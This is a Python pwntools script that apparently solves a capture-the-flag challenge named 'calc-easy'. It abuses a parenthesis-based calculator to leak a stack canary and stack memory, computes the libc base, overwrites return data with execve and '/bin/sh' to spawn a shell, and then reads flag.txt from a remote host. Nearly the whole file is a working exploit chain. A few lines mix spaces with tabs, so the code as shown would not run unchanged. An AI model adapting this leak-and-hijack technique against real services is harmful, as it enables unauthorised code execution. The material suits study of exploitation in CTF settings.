from pwn import *

BUF_SIZE = 32
LOOPS_AFTER_CANARY = 16

INIT_BACK = ')))'


def sum_of_list_mod__2_32(list_to_sum):
	output = 0

	for el in list_to_sum:
		output += el

	return output % 2**32


def easy_solver(conn, DEBUG=False, LOCAL=False, GDB=False, NON_INTERACTIVE=False):
	p = conn

	if DEBUG and LOCAL and GDB:
		gdb.attach(p)

	# get canary
	canary_load = '(' * BUF_SIZE + ')' * (BUF_SIZE - 1)
	p.sendline(canary_load)
	raw_canary = int(p.recvline())
	canary = raw_canary & 0xFFFFFFFF

	# check & show canary
	if DEBUG:
		print("CANARY CHECK: %d" % canary)

	memory_after_buffer = list()
	memory_after_buffer.append(canary)

	# get more memory after canary
	for i in range(1, LOOPS_AFTER_CANARY):
		if DEBUG:
			print("(FETCHER) LOOP COUNTER %d" % i)

		current_load = '(' * (BUF_SIZE + i) + INIT_BACK

		for mem_chunk in reversed(memory_after_buffer):
			current_load += '+' + str(mem_chunk) + ')'

		current_load += ')' * (BUF_SIZE + i - 1 - len(INIT_BACK) - len(memory_after_buffer))
		if DEBUG:
			print('(FETCHER) LOAD: ' + current_load)

		p.sendline(current_load)

		next_value = (int(p.recvline()) % 2**32 - sum_of_list_mod__2_32(memory_after_buffer)) % 2**32
		memory_after_buffer.append(next_value)

		if DEBUG:
			print('(FETCHER) ACQUIRED: %d' % (next_value))

	if LOCAL:
		offset = 247
		libc_elf = ELF(p.libc.path)
	else:
		offset = 243
		libc_elf = ELF('libc-2.19.so')

	libc_start_offset = libc_elf.symbols['__libc_start_main']
	libc_base = (memory_after_buffer[8] - offset - libc_start_offset)

	if DEBUG:
		print("LIBC BASE: " + hex(libc_base))

	execve_offset = libc_elf.symbols['execve']
	execve_address = libc_base + execve_offset
	binsh_offset = list(libc_elf.search('/bin/sh'))[0]
	binsh_address = libc_base + binsh_offset

	memory_after_buffer[4] = execve_address
	memory_after_buffer[6] = binsh_address
	memory_after_buffer[7] = 0
	memory_after_buffer[8] = 0

	final_load = '(' * (BUF_SIZE + LOOPS_AFTER_CANARY) + INIT_BACK

        for mem_chunk in reversed(memory_after_buffer):
                final_load += '+' + str(mem_chunk) + ')'

        final_load += ')' * (BUF_SIZE + LOOPS_AFTER_CANARY - 1 - len(INIT_BACK) - len(memory_after_buffer))

	if DEBUG:
		print("FINAL LOAD: " + final_load)

	p.sendline(final_load)

	if NON_INTERACTIVE:
		if LOCAL:
			p.sendline("find . -name 'flag.txt'")
			returned = p.recvline()
			returned = p.recvline()

			if 'flag' in returned:
				print('OK!')
			else:
				print('NOT OK!')
		else:
			p.sendline('cat flag.txt')
			p.recvline()
			print(p.recvline())
	else:
		p.interactive()

	p.close()

# easy_solver(process('./calc-easy'), DEBUG=False, LOCAL=True, GDB=False, NON_INTERACTIVE=True)
easy_solver(connect('h4x.0x04.net', 1337), DEBUG=False, LOCAL=False, NON_INTERACTIVE=True)
